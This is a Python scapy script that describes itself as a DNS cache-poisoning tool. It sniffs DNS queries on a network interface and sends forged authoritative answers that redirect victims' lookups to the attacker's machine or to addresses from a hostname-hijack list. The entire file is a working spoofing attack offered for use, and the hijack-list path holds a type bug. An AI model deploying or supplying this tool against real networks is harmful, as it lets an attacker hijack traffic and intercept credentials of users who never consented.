from scapy.all import Ether, IP, UDP, DNS, DNSRR, sniff, sendp
import argparse
import os
import socket
parser = argparse.ArgumentParser(description = "[Info] Captures network traffic and attempts to inject forged responses to poison the cache of a victim's resolver.")
parser.add_argument('-i', metavar='interface', help='the network device to listen to')
parser.add_argument('-f', metavar='hostnames', help='a list of IP addresses and hostname pairs specifying the hostnames to be hijacked')
parser.add_argument('expression', help='a BPF filter that specifies a subset of the traffic to be monitored', nargs='?')
args = parser.parse_args()
pi = {}
i = args.i if args.i else "eth0"
if args.f:
    with open(args.f) as fd:
        for line in fd:
            line = line.strip().split()
            pi[line[1]] = bytes(line[0] + ".")
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
poison_ip = s.getsockname()[0]
s.close()
def p(pkt):
    if not pkt.haslayer("DNS") or not pkt.haslayer("UDP") or not pkt.haslayer("IP") or not pkt.haslayer("Ether"): return
    if pkt["DNS"].qr != 0 or pkt["DNS"].qd.qtype != 1: return
    del pkt["IP"].len
    del pkt["IP"].chksum
    del pkt["UDP"].len
    del pkt["UDP"].chksum
    pkt["Ether"].src, pkt["Ether"].dst = pkt["Ether"].dst, pkt["Ether"].src
    pkt["IP"].src, pkt["IP"].dst = pkt["IP"].dst, pkt["IP"].src
    pkt["UDP"].sport, pkt["UDP"].dport = pkt["UDP"].dport, pkt["UDP"].sport
    pkt["DNS"].qr = 1
    pkt["DNS"].aa = 1
    pkt["DNS"].an = DNSRR(rrname=pkt["DNS"].qd.qname, ttl=30, type="A", rdata=poison_ip)
    pkt["DNS"].ancount = 1
    sendp(pkt, iface=i, verbose=0)
def pf(p):
    if p["DNS"].qd.qtype != 1: return
    q = p["DNS"].qd.qname
    if q not in pi: return
    sendp(Ether(src=p["Ether"].dst, dst=p["Ether"].src, type=p["Ether"].type)/IP(src=p["IP"].dst, dst=p["IP"].src)/UDP(sport=p["UDP"].dport, dport=p["UDP"].sport)/DNS(qr=1,aa=1,ancount=1,qd=p["DNS"].qd, an=DNSRR(rrname=q,type="A",ttl=30,rdata=pi[q])), iface=i, verbose=0)
bpf_filter = str.lower(args.expression) if args.expression else "dst port 53"
sniff(iface = i, filter=bpf_filter, prn=pf if pi else p, store=0)